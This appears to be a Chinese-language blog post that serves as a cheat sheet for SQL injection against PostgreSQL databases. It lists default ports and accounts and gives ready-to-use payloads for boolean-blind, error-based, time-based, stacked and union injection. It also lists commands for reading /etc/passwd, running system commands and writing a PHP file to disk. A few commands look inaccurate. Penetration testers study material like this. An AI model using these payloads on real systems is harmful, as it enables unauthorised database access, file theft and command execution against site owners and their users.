**目录**

[PostgreSQL](#t0)

[PostgreSQL常用查询命令](#t1)

[布尔盲注](#t2)

[错误注入](#t3)

[堆叠注入](#t4)

[时间盲注](#t5)

[联合查询](#t6)

* * *

PostgreSQL
----------

[PostgreSQL](https://so.csdn.net/so/search?q=PostgreSQL&spm=1001.2101.3001.7020)是一种特性非常齐全的自由软件的对象-关系型数据库管理系统（ORDBMS），4.2版本为基础的对象关系型数据库管理系统。

PostgreSQL安装后，默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。

*   注释符：--             
*   延时函数：pg\_sleep(3)

![](https://img-blog.csdnimg.cn/20200827095319613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

PostgreSQL和MySQL一样，也有 information\_schema 数据库。

PostgreSQL安装后默认是不允许其他主机连接的，如果要让其他主机连接，找到PostgreSQL安装目录下的/data/pg\_hba.conf， 找到“# IPv4 local connections:”，然后在下面添加你的IP地址

```
host    all             all             192.168.10.1/32         md5
```


![](https://img-blog.csdnimg.cn/20200303221224565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### PostgreSQL常用查询命令

```
select CURRENT_SCHEMA()           #查看当前权限      
select user                       #查看用户      
select current_user               #查看当前用户      
select chr(97)                    #将ASCII码转为字符      
select chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  #将ASCII转换为字符串      
SELECT session_user;      
SELECT usename FROM pg_user;      
SELECT getpgusername();      
select version()                  #查看PostgreSQL数据库版本      1
SELECT current_database()         #查看当前数据库      1
select length('admin')            #查看长度       1
select case when(expr1) then result1 else result2 end;  #如果xx，执行result1，否则result2      1
例：select case when(current_user='postgres') then pg_sleep(5) else pg_sleep(0) end;       1
select pg_read_file("/etc/passwd");          #读取文件      1
select system("whoami");                     #执行系统命令,11.2以下才有该命令      1
COPY (select '<?php phpinfo();?>') to '/tmp/1.php';   #写入文件
```


### 布尔盲注

```
1 AND ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(DISTINCT(schemaname)) AS CHARACTER(10000)),(CHR(32))) FROM pg_tables)::text FROM 1 FOR 1))>48
```


![](https://img-blog.csdnimg.cn/20200304171844751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 错误注入

报错注入需要目标网站开启了报错提示。

```
1 AND 2518=CAST((CHR(113)||CHR(98)||CHR(122)||CHR(98)||CHR(113))||(SELECT COALESCE(CAST(schemaname AS CHARACTER(10000)),(CHR(32))) FROM pg_tables OFFSET 0 LIMIT 1)::text||(CHR(113)||CHR(112)||CHR(106)||CHR(98)||CHR(113)) AS NUMERIC)
```


![](https://img-blog.csdnimg.cn/20200304172145341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 堆叠注入

和MySQL的堆叠注入一样，在后面加上查询语句即可。

![](https://img-blog.csdnimg.cn/20200304162739850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 时间盲注

```
select pg_sleep(3)
```


![](https://img-blog.csdnimg.cn/20200304163740871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 联合查询

```
order by 3   #查看显示列      
select null,null,函数      
然后接下来就是和MySQL注入一样了，关于PostgreSQL的语句可以查看SQLMap
```


![](https://img-blog.csdnimg.cn/20200304162500638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200304162514599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2020030416242268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

更多语句查看SQLMap